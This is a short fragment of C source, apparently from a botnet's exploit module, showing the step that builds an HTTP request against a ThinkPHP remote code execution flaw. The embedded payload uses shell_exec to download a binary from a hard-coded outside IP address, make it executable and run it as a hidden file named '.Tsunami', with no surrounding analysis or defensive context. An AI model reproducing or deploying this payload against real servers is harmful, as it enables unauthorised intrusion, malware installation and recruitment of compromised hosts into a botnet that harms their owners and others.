            ...
            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if (err == 0 && ret == 0)
                {
                    if (conn->state == thinkphp_SC_EXPLOIT_STAGE2)
                    {
                        ...
                        util_strcpy(conn->payload_buf, "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.237.96.86/xd.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: /\r\nUser-Agent: Tsunami/2.0\r\n\r\n");
